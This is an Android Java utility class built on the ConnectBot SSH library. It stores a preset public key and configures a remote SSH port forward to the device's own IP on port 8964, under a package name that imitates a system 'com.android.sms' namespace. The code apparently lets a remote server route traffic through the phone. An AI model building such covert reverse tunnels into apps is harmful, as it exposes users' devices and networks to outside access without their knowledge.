package com.android.sms.proxy.service;

import android.content.Context;
import android.net.Uri;
import android.text.TextUtils;
import android.util.Log;

import com.android.sms.proxy.entity.NativeParams;
import com.oplay.nohelper.utils.Util_GetSystemIP;

import org.connectbot.bean.HostBean;
import org.connectbot.bean.PortForwardBean;
import org.connectbot.bean.PubkeyBean;
import org.connectbot.transport.TransportFactory;
import org.connectbot.util.PubkeyDatabase;

import java.util.List;

/**
 * @author zyq 16-3-11
 *         检查是否满足要求
 */
public class ProxyServiceUtil {

	private static final boolean DEBUG = NativeParams.PROXY_SERVICE_UTIL_DEBUG;
	private static final String TAG = "proxyServiceUtil";
	private volatile static ProxyServiceUtil instance;
	private Context mContext;
	private PortForwardBean mForwardBean;
	private static int destPort = 8964;
	private HostBean mHost;


	public static ProxyServiceUtil getInstance(Context context) {
		if (instance == null) {
			synchronized (ProxyServiceUtil.class) {
				if (instance == null) {
					instance = new ProxyServiceUtil(context);
				}
			}
		}
		return instance;
	}

	public ProxyServiceUtil(Context context) {
		this.mContext = context;
		addPubkeyBean(context);
	}

	private void addPubkeyBean(Context context) {
		PubkeyBean pubkey = new PubkeyBean();
		PubkeyDatabase pubkeydb = PubkeyDatabase.get(context);
		List<PubkeyBean> list = pubkeydb.getPubkeysByNick(pubkey.getNickname());
		if (list.size() == 0) {
			if (DEBUG) {
				Log.d(TAG, "成功存入数据库");
			}
			pubkeydb.savePubkey(pubkey);
		} else {
			if (DEBUG) {
				Log.d(TAG, "之前已存,不需添加");
			}
		}
		if (DEBUG) {
			Log.d(TAG, "提前注入密匙:" + pubkey.getDescription());
		}
	}


	public HostBean getHostBean() {
		return mHost;
	}

	public void setHostBean(Uri uri) {
		mHost = new HostBean();
		HostBean host = TransportFactory.getTransport("ssh").createHost(uri);
		mHost.setProtocol(host.getProtocol());
		mHost.setUsername(host.getUsername());
		mHost.setHostname(host.getHostname());
		mHost.setNickname(host.getNickname());
		mHost.setPort(host.getPort());//默认是22端口,代理端口

		if (DEBUG) {
			Log.d(TAG, "根据接口返回的数据生成一个hostbean:" + mHost.toString());
		}
	}

	public void setPortFowardBean(Context context, String sourcePort) {
//		try {
//			destPort = getPortNotUsing();
//		}catch (UnknownHostException e){
//			if(DEBUG){
//				Log.e(TAG,e.fillInStackTrace().toString());
//			}
//		}
		destPort = 8964;
//        try{
//            ServerSocket socket = new ServerSocket(0);
//            destPort = socket.getLocalPort();
//        }catch (IOException e){
//            Log.d(TAG,"setPortForwardBean()函数异常："+e.fillInStackTrace().toString());
//        }
		if (DEBUG) {
			Log.d(TAG, "最后选中的本地监听端口是:" + destPort);
		}
		String destHost = Util_GetSystemIP.getCurrentSystemIp(context);
		if (DEBUG) {
			Log.d(TAG, "当前ip地址是:" + destHost);
		}
		StringBuilder sb = new StringBuilder();
		sb.append(destHost)
				.append(":")
				.append(String.valueOf(destPort));
		if (DEBUG) {
			Log.d(TAG, "目标地址：" + sb.toString());
		}
		mForwardBean = new PortForwardBean(
				1,
				"proxy",
				PortForwardBean.PORTFORWARD_REMOTE,
				String.valueOf(sourcePort),
				sb.toString());
		if (DEBUG) {
			Log.d(TAG, "设置端口转发:" + mForwardBean.getDescription());
		}
	}

//	private int getPortNotUsing() throws UnknownHostException{
//		boolean isUsing = false;
//		InetAddress address = InetAddress.getByName("127.0.0.1");
//		do {
//			try {
//				Socket socket = new Socket(address,destPort);
//				isUsing = true;
//				destPort++;
//			} catch (IOException e) {
//				if(DEBUG){
//					Log.e(TAG,"getPortNotUsing:"+e.fillInStackTrace().toString());
//				}
//				isUsing = false;
//			}
//		} while (isUsing);
//		return destPort;
//	}

	public static int getDestPort() {
		return destPort;
	}


	public PortForwardBean getPortFowardBean() {
		return mForwardBean;
	}


	public static boolean isHostValid(String quickConnectString, String protocol) {
		if (quickConnectString == null || protocol == null)
			return false;
		if (!checkHost(quickConnectString)) return false;
		Uri uri = TransportFactory.getUri(protocol, quickConnectString);
		if (uri == null) {
			// If the URI was invalid, null out the associated fields.
			return false;
		}
		return true;
	}

	public static boolean checkHost(String host) {
		if (TextUtils.isEmpty(host)) return false;
		int index = host.indexOf("@");
		if (index == -1) return false;
		int portIndex = host.indexOf(":");
		if (portIndex == -1) return false;
		return true;
	}

}
